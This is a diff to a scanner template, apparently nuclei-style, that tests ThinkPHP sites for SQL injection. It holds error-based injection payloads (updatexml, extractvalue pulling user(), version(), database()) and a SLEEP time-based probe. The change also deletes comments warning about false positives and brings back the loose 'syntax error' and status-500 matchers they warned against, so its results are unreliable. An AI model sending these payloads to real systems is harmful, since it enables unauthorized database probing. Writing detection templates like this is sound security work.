@@ -12,32 +12,46 @@ info:
   reference:
     - https://vulhub.org/#/environments/thinkphp/in-sqlinjection/
 
+# 定义针对不同策略的 Payload 集合
+payload_sets:
+  default:
+    - "0,updatexml(0,concat(0xa,user()),0)"
+    - "0,updatexml(0,concat(0xa,version()),0)"
+    - "0,extractvalue(1,concat(0xa,user()))"
+  aggressive:
+    - "0,updatexml(0,concat(0xa,user()),0)"
+    - "0,updatexml(0,concat(0xa,version()),0)"
+    - "0,updatexml(0,concat(0xa,database()),0)"
+    - "0,extractvalue(1,concat(0xa,user()))"
+    - "0,extractvalue(1,concat(0xa,version()))"
+
 requests:
-  # 测试1: updatexml 报错注入（仅匹配 MySQL 报错正文，禁止用 "updatexml" 等词：
-  # Django/Flask DEBUG 页会把请求 URL 回显到响应体，导致 payload 中的函数名被误当成数据库报错）
+  # 测试1: 数组参数注入 (TP5 典型漏洞)
   - method: GET
     preconditions:
-      methods: [GET]
       requires_tech: [thinkphp]
     path:
-      - "{{BaseURL}}/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1"
-      - "{{BaseURL}}/index.php?ids[0,updatexml(0,concat(0xa,version()),0)]=1"
-      - "{{BaseURL}}/index.php?ids[0,updatexml(0,concat(0xa,database()),0)]=1"
+      - "{{BaseURL}}/index.php?ids[{{payload}}]=1"
+      - "{{BaseURL}}/?s=index/index/index&ids[{{payload}}]=1"
+    matchers-condition: or
     matchers:
       - type: word
         words:
           - "XPATH syntax error"
-        condition: and
+          - "syntax error"
+          - "SQLSTATE"
+        condition: or
         part: body
+      - type: status
+        status: [500]
 
-  # 测试2: extractvalue / updatexml 报错（同样只认 MySQL XPATH 报错字符串）
+  # 测试2: 通用 SQL 探测 (防止路径识别失败)
   - method: GET
     preconditions:
-      methods: [GET]
       requires_tech: [thinkphp]
     path:
-      - "{{BaseURL}}/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1"
-      - "{{BaseURL}}/index.php?ids[0,extractvalue(1,concat(0xa,user()))]=1"
+      - "{{BaseURL}}/index.php?id={{payload}}"
+      - "{{BaseURL}}/?s=index/index/index&id={{payload}}"
     matchers-condition: and
     matchers:
       - type: status
@@ -45,54 +59,11 @@ requests:
       - type: word
         words:
           - "XPATH syntax error"
-        condition: and
         part: body
 
-  # 测试3: version() 报错注入（版本号 + 真实 SQL 报错特征；不用 "updatexml" 以免 URL 回显误报）
+  # 测试3: 时间盲注探测
   - method: GET
     preconditions:
-      methods: [GET]
-      requires_tech: [thinkphp]
-    path:
-      - "{{BaseURL}}/index.php?ids[0,updatexml(0,concat(0xa,version()),0)]=1"
-    matchers-condition: and
-    matchers:
-      - type: status
-        status: [500]
-      - type: regex
-        regex:
-          - "\\d+\\.\\d+\\.\\d+"
-        part: body
-      - type: word
-        words:
-          - "XPATH syntax error"
-          - "MySQL server version"
-        condition: or
-        part: body
-
-  # 测试4: 检查典型 MySQL/PHP 驱动报错（移除泛化的 "syntax error"，Django 调试页常含该短语）
-  - method: GET
-    preconditions:
-      methods: [GET]
-      requires_tech: [thinkphp]
-    path:
-      - "{{BaseURL}}/index.php?ids[' OR '1'='1']=1"
-      - "{{BaseURL}}/index.php?ids[1 AND 1=1]=1"
-    matchers:
-      - type: word
-        words:
-          - "SQL syntax"
-          - "mysql_fetch"
-          - "mysql_error"
-          - "mysqli_"
-          - "Query failed"
-        condition: or
-        part: body
-
-  # 测试5: 时间盲注检测（通过响应时间差异）
-  - method: GET
-    preconditions:
-      methods: [GET]
       requires_tech: [thinkphp]
     path:
       - "{{BaseURL}}/index.php?ids[SLEEP(3)]=1"
